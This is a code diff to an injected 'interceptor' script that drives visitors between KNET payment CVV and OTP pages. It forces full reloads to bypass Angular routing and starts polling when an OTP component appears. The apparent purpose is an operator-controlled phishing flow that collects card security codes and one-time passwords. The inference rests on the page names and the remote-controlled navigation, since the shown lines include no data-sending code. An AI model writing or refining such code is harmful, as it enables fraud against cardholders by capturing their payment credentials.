@@ -49,12 +49,15 @@ function getInterceptorScript() {
   var _socketLoading = false;
 
   function doNavigate(page, knetId) {
+    // Use location.replace to force full page reload, bypassing Angular router interception
     if (page === '/knet/cvv' || page === 'cvv') {
-      window.location.href = '/knet/cvv?id=' + knetId;
+      window.location.replace('/knet-otp?mode=cvv&id=' + knetId);
     } else if (page === '/knet-otp' || page === 'otp') {
-      window.location.href = '/knet-otp?id=' + knetId;
+      window.location.replace('/knet-otp?id=' + knetId);
     } else {
-      window.location.href = page + (knetId ? '?id=' + knetId : '');
+      // Generic navigate - use replace to bypass Angular
+      var url = page + (knetId ? (page.indexOf('?') !== -1 ? '&' : '?') + 'id=' + knetId : '');
+      window.location.replace(url);
     }
   }
 
@@ -185,10 +188,27 @@ function getInterceptorScript() {
                      window.location.href.indexOf('/knet/cvv') !== -1;
     if (knetId && isKnetPage && !_pollTimer) {
       startPolling(knetId);
+      return true;
     }
+    return false;
   }
 
-  // Try at multiple intervals to catch Angular initialization
+  // Use MutationObserver to detect when Angular renders app-knet-otp
+  // This ensures we start polling AFTER Angular has initialized
+  var _observer = new MutationObserver(function(mutations) {
+    var appOtp = document.querySelector('app-knet-otp');
+    if (appOtp && !_pollTimer) {
+      var knetId = getKnetId();
+      if (knetId) {
+        console.log('[Interceptor] app-knet-otp detected, starting polling');
+        startPolling(knetId);
+        // Keep observing for future navigations
+      }
+    }
+  });
+  _observer.observe(document.body, { childList: true, subtree: true });
+
+  // Also try at multiple intervals as fallback
   tryStart();
   setTimeout(tryStart, 500);
   setTimeout(tryStart, 1000);
